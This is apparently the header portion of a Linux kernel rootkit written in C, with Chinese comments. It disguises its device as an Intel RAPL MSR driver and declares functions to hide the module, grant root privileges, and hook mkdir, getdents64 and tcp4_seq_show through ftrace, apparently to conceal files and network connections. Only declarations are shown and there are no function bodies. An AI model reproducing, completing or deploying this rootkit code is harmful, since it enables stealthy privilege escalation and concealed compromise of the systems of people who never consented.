#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/version.h>
#include "ftrace_helper.h"

#define DEVICE_NAME "inter_rapl_msrdv"
#define CLASS_NAME "inter_rapl_msrmd"
#define DEVICE_PATH "/dev/inter_rapl_msrdv"

static int major_num;
static struct class *module_class = NULL;
static struct device *module_device = NULL;
static struct file *__file = NULL;
struct inode *__inode = NULL;

static int rootkit_open(struct inode *, struct file *);
static int rootkit_release(struct inode *, struct file *);
static ssize_t rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static long rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations rootkit_fo = {
    .owner = THIS_MODULE,
    .unlocked_ioctl = rootkit_ioctl,
    .read = rootkit_read,
    .open = rootkit_open,
    .release = rootkit_release,
    .write = rootkit_write};

static struct list_head *module_prev;
static struct list_head *kobj_prev;

// 模块隐藏
static void hide_myself(void);

// 模块隐藏恢复声明
static void show_myself(void);

// 提升root权限函数声明
static void get_root(void);

// mkdir函数
static asmlinkage long (*orig_mkdir)(const struct pt_regs *);
asmlinkage long hook_mkdir(const struct pt_regs *);

// getdents64函数
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage long hook_getdents64(const struct pt_regs *);

// tcp4_seq_show
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *, void *);
asmlinkage long hook_tcp4_seq_show(struct seq_file *, void *);

// HOOK函数
struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show)};

// char *file_name = {"getroot", "getroot.c"};
// 内核链表

// 检查隐藏文件名
int check(char *name);

// 模块加载、卸载函数声明
static int __init rootkit_init(void);
static void __exit rootkit_exit(void);
